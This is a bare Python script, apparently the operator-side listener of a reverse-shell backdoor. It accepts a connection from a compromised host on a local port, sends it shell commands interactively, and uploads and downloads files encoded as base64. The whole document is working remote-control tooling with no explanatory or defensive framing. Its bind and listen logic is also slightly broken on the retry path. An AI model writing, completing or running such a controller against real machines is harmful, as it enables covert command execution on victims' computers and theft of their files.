import socket,json,base64

class Remotelistener:
    def __init__(self,ipaddress,portno):
        self.ipaddress=ipaddress
        self.portno=portno
        self.socket=socket.socket()
        self.binding()
        self.accepting()

    def binding(self):
        try:
            sock=self.socket.bind((self.ipaddress,self.portno))
            print(sock)
        except:
            self.socket.bind((self.ipaddress,self.portno))
        else:
            self.socket.listen(3)

    def accepting(self):
        self.connection,ipaddress=self.socket.accept()
        print(f"Got connection from {ipaddress[0]} of {ipaddress[1]}")

    
    def send(self,data):
	    json_text = json.dumps(data)
	    self.connection.send(json_text.encode())

    def receive(self):
	    json_text = ""
	    while True:
		    try:
			    json_text = json_text+self.connection.recv(1024).decode()
			    return json.loads(json_text)
		    except ValueError:
			    continue

    def execute(self,command):
	    self.send(command)
	    if command[0] == "quit":
		    self.connection.close()
		    exit()

	    return self.receive()

    def writing_to_file(self,path,content):
	    with open(path,"wb") as file:
		    file.write(base64.b64decode(content))
		    return "Downloaded"

    def read_file(self,path):
	    with open(path,"rb") as file:
		    return base64.b64encode(file.read())

    def run(self):
	    while True:
		    command =input(">")
		    command = command.split(" ")

		    try:

			    if command[0] == "upload":
				    file_content = self.read_file(command[1])
				    command.append(file_content)
					
			    result = self.execute(command)
		
			    if command[0] == "download" and "[-] Error " not in result:
				    result = self.writing_to_file(command[1],result)
					
		    except Exception:
			    result = "Error during command execution"
		    print (result)
			
my_listener = Remotelistener("127.0.0.1",11234)
my_listener.run()
